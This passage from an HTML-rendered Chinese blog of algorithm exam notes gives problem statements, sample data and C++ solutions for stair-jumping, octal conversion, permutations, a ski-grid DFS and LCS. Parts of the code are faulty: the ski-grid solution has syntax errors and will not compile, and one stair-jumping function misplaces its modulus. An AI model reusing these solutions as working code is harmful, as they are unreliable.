href="#跳台阶-考试考了类似的" class="headerlink" title="跳台阶(考试考了类似的)"></a>跳台阶(考试考了类似的)</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法。</p><h5 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h5><p>多组测试样例。每组测试样例包含一个整数n。(1&lt;=n&lt;=100)</p><h5 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h5><p>每组测试样例输出一行，表示青蛙跳上n级台阶的跳法数量.</p><p>所得到的结果模1000000007</p><h5 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h5 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">5</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> l=<span class="number">1000000007</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> dp[<span class="number">205</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">solve_1</span><span class="params">(<span class="keyword">int</span> n )</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">long</span> <span class="keyword">long</span> count[<span class="number">205</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span>(count[n] != <span class="number">0</span> ) <span class="keyword">return</span> count[n];  <span class="comment">//这里有点像备忘录方法，不然直接递归这题会超时</span></span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>( <span class="number">1</span> == n) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>( <span class="number">2</span> == n) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    count[n] = solve_1(n<span class="number">-1</span>)+solve_1(n<span class="number">-2</span>)%l;</span><br><span class="line">    <span class="keyword">return</span> count[n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve_2</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">2</span> ; i &lt;= n; i++)&#123;</span><br><span class="line">        dp[i] = (dp[i<span class="number">-1</span>]+dp[i<span class="number">-2</span>])%l;   <span class="comment">//关键是这个递推式</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;dp[n]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;solve_1(n)&lt;&lt;<span class="built_in">endl</span>;<span class="comment">//递归</span></span><br><span class="line">        solve_2(n); <span class="comment">//动态规划</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="进制转换-考试考了类似的"><a href="#进制转换-考试考了类似的" class="headerlink" title="进制转换(考试考了类似的)"></a>进制转换(考试考了类似的)</h3><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><p>输入一个十进制正整数，然后输出它所对应的八进制数。</p><h5 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h5><p>输入一个十进制正整数n(1≤n≤106) 。</p><h5 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h5><p>输出n对应的八进制数，输出在一行。</p><h5 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10</span><br></pre></td></tr></table></figure><h5 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> s[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> tmp=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(num!=<span class="number">0</span>)&#123;</span><br><span class="line">tmp = num%<span class="number">8</span>;</span><br><span class="line">num = num/<span class="number">8</span>;</span><br><span class="line">s[i++] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=i<span class="number">-1</span>;j&gt;=<span class="number">0</span>;j--)&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;s[j];</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*这个题目也可以用栈去模拟，几进制自己灵活变通*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">solve(a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="排列问题"><a href="#排列问题" class="headerlink" title="排列问题"></a>排列问题</h3><h4 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h4><p>输入一个可能含有重复字符的字符串，打印出该字符串中所有字符的全排列。</p><h5 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h5><p>单组测试数据，输入数据是一个长度不超过10个字符的字符串，以逗号结尾。</p><h5 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h5><p>打印出该字符串中所有字符的全排列。以字典序顺序输出，用空格分隔。</p><h5 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abc,</span><br></pre></td></tr></table></figure><h5 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abc acb bac bca cab cba</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> a[<span class="number">200</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line"><span class="keyword">int</span> lena = <span class="built_in">strlen</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; lena<span class="number">-1</span>; i++ ) &#123; <span class="built_in">cout</span> &lt;&lt; a[i]; &#125; <span class="built_in">cout</span> &lt;&lt; <span class="string">" "</span>; </span><br><span class="line">&#125; <span class="keyword">while</span>( next_permutation(a, a+lena<span class="number">-1</span>) );  <span class="comment">//关键是这个函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="全排列"><a href="#全排列" class="headerlink" title="全排列"></a>全排列</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Perm</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">list</span>,<span class="keyword">int</span> k,<span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>( k == m)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ;i &lt;= m; i++) <span class="built_in">cout</span>&lt;&lt;<span class="built_in">list</span>[i];</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=k; i&lt;=m; i++)&#123;</span><br><span class="line">swap(<span class="built_in">list</span>[k],<span class="built_in">list</span>[i]);</span><br><span class="line">Perm(<span class="built_in">list</span>,k+<span class="number">1</span>,m);</span><br><span class="line">swap(<span class="built_in">list</span>[k],<span class="built_in">list</span>[i]);  <span class="comment">//关键是换位之后记得还原现场</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line"><span class="keyword">int</span> lena = <span class="built_in">strlen</span>(a);</span><br><span class="line">a[lena<span class="number">-1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">lena  = <span class="built_in">strlen</span>(a);</span><br><span class="line">sort(a,a+lena);</span><br><span class="line">Perm(a,<span class="number">0</span>,lena<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="矩形滑雪场"><a href="#矩形滑雪场" class="headerlink" title="矩形滑雪场"></a>矩形滑雪场</h3><h4 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h4><p>zcb喜欢滑雪。他来到了一个滑雪场，这个滑雪场是一个矩形，为了简便，我们用r行c列的矩阵来表示每块地形。为了得到更快的速度，滑行的路线必须向下倾斜。 例如样例中的那个矩形，可以从某个点滑向上下左右四个相邻的点之一。例如24-17-16-1，其实25-24-23…3-2-1更长，事实上这是最长的一条。</p><h5 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h5><p>第1行:两个数字r，c(1 ≤ r, c ≤ 100)，表示矩阵的行列。第2..r+1行:每行c个数，表示这个矩阵。</p><h5 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h5><p>仅一行:输出1个整数，表示可以滑行的最大长度。</p><h5 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5 5</span><br><span class="line">1 2 3 4 5</span><br><span class="line">16 17 18 19 6</span><br><span class="line">15 24 25 20 7</span><br><span class="line">14 23 22 21 8</span><br><span class="line">13 12 11 10 9</span><br></pre></td></tr></table></figure><h5 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">25</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> r,c;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">105</span>][<span class="number">105</span>];</span><br><span class="line"><span class="keyword">int</span> record[<span class="number">105</span>][<span class="number">105</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> m_x[<span class="number">4</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> m_y[<span class="number">4</span>] = &#123;<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(record[x][y]) <span class="keyword">return</span> record[x][y];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> i&lt; <span class="number">4</span> ;i++)&#123;  <span class="comment">//往四个方向深搜</span></span><br><span class="line"><span class="keyword">int</span> wx = x+ m_x[i];</span><br><span class="line"><span class="keyword">int</span> wy = y+ m_y[i];</span><br><span class="line"><span class="keyword">if</span>(wx &gt;= <span class="number">1</span> &amp;&amp; wx &lt;= r &amp;&amp; wy &gt;=<span class="number">1</span> &amp;&amp; wy&lt;= c &amp;&amp; m[x][y] &gt; m[wx][wy])&#123;</span><br><span class="line">record[x][y] = max(record[x][y], dfs(wx,wy)+<span class="number">1</span>); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> record[x][y];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;r&gt;&gt;c;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>;i &lt;=r ;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j&lt;=c;j++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;m[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> result  =<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>;i &lt; = r; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j =<span class="number">1</span> ; j&lt;=c;j++)&#123;</span><br><span class="line">record[i][j] = dfs(i,j);</span><br><span class="line">result = max(record[i][j],result);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;result + <span class="number">1</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">retrun <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h2><p>这种题目关键记住dp公式就好书上都有不多说</p><h3 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h3><h4 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。<br>例如：Z=&lt;a,b,f,c&gt;是序列X=&lt;a,b,c,f,b,c&gt;的一个子序列，Z中的元素在X中的下标序列为&lt;1,2,4,6&gt;。<br>现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？</p><h5 id="输入-5"><a href="#输入-5" class="headerlink" title="输入"></a>输入</h5><p>输入包含多组测试数据。每组输入占一行，为两个字符串，由若干个空格分隔。每个字符串的长度不超过100。</p><h5 id="输出-5"><a href="#输出-5" class="headerlink" title="输出"></a>输出</h5><p>对于每组输入，输出两个字符串的最长公共子序列的长度。</p><h5 id="样例输入-5"><a href="#样例输入-5" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abcfbc abfcab</span><br><span class="line">programming contest </span><br><span class="line">abcd mnp</span><br></pre></td></tr></table></figure><h5 id="样例输出-5"><a href="#样例输出-5" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">2</span><br><span class="line">0</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> c[<span class="number">2005</span>][<span class="number">2005</span>];</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">2005</span>][<span class="number">2005</span>];</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">2005</span>],b[<span class="number">2005</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*构造最优解*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LCS</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(i ==<span class="number">0</span>|| j==<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(m[i][j] == <span class="number">1</span>)&#123;</span><br><span class="line">LCS(i<span class="number">-1</span>,j<span class="number">-1</span>);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;a[i<span class="number">-1</span>];</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(m[i][j] == <span class="number">2</span>)&#123;</span><br><span class="line">LCS(i<span class="number">-1</span>,j);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">LCS(i,j<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> lena,<span class="keyword">int</span> lenb)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i &lt;=lena ;i++)&#123;</span><br><span class="line">c[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j =<span class="number">0</span>;j&lt;=lenb;j++)&#123;</span><br><span class="line">c[<span class="number">0</span>][j] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=lena;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=lenb;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i<span class="number">-1</span>] == b[j<span class="number">-1</span>]) &#123;</span><br><span class="line">c[i][j] = c[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">m[i][j] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(c[i<span class="number">-1</span>][j] &gt;= c[i][j<span class="number">-1</span>])&#123;</span><br><span class="line">c[i][j] = c[i<span class="number">-1</span>][j];</span><br><span class="line">m[i][j] =<span class="number">2</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">c[i][j] = c[i][j<span class="number">-1</span>];</span><br><span class="line">m[i][j] = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; c[lena][lenb]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//LCS(lena,lenb);</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;b;</span><br><span class="line"><span class="keyword">int</span> lena = <span class="built_in">strlen</span>(a);</span><br><span class="line"><span class="keyword">int</span> lenb = <span class="built_in">strlen</span>(b);</span><br><span class="line">solve(lena,lenb);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="矩阵连乘"><a href="#矩阵连乘" class="headerlink" title="矩阵连乘"></a>矩阵连乘</h3><h4 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定n个矩阵{A1,A2,…,An}，及m个矩阵连乘的表达式，判断每个矩阵连乘表达式是否满足矩阵乘法法则，如果满足，则计算矩阵的最小连乘次数，如果不满足输出“MengMengDa“。</p><h5 id="输入-6"><a href="#输入-6" class="headerlink" title="输入"></a>输入</h5><p>输入数据由多组数据组成（不超过10组样例）。每组数据格式如下：<br>第一行是2个整数n (1≤n≤26)和m(1≤m≤3)，表示矩阵的个数。<br>接下来n行，每行有一个大写字母，表示矩阵的名字，后面有两个整数r和c，分别表示该矩阵的行数和列数，其中1 &lt; r, c<br>第n+1行到第n+m行，每行是一个矩阵连乘的表达式(2&lt;=矩阵个数&lt;=100)。</p><h5 id="输出-6"><a href="#输出-6" class="headerlink" title="输出"></a>输出</h5><p>对于每个矩阵连乘表达式，如果运算不满足矩阵乘法法则的情况（即左矩阵列数与右矩阵的行数不同），则输出“MengMengDa”，否则输出最小矩阵连乘次数。</p><p>数据保证结果不超过1e9。</p><h5 id="样例输入-6"><a href="#样例输入-6" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">3 2</span><br><span class="line">A 10 100</span><br><span class="line">B 5 50</span><br><span class="line">C 100 5</span><br><span class="line">ACB</span><br><span class="line">ABC</span><br></pre></td></tr></table></figure><h5 id="样例输出-6"><a href="#样例输出-6" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">7500</span><br><span class="line">MengMengDa</span><br></pre></td></tr></table></figure><figure class="highlight 